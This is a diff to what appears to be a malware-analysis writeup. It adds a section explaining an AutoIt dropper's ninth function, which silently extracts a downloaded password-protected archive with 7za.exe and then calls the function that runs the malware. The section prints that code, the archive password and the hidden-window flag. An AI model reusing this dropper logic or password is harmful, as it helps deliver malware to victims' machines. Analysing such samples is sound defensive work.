@@ -462,3 +462,11 @@ Func main8($sevenzipurl, $virusurl) ; Download 7-zip and virus
 EndFunc
 ```
 <br> It check if `7za.exe` available in that directory or not, if not then download it from the provided `$sevenzipurl`. After that, download the virus with the provided URL at `$virusurl`
+#### 9) 9th function: Extract the virus
+```autoit
+Func main9() ; Extract the virus
+	RunWait($virusdir & "\" & "7za.exe e files.7z -aoa -pKEQZmgbrmDnTpa2b4DHVMX", $virusdir, @SW_HIDE) ; Extract the virus, the protected password is KEQZmgbrmDnTpa2b4DHVMX
+	main10() ; This is when the malware get executed, so if you want to fetch the file only, please comment this line!!!
+EndFunc
+```
+<br> It extracts the archive downloaded (`files.7z`) by using 7-zip console app. The password of the archive is `KEQZmgbrmDnTpa2b4DHVMX` - as you can see in the command line
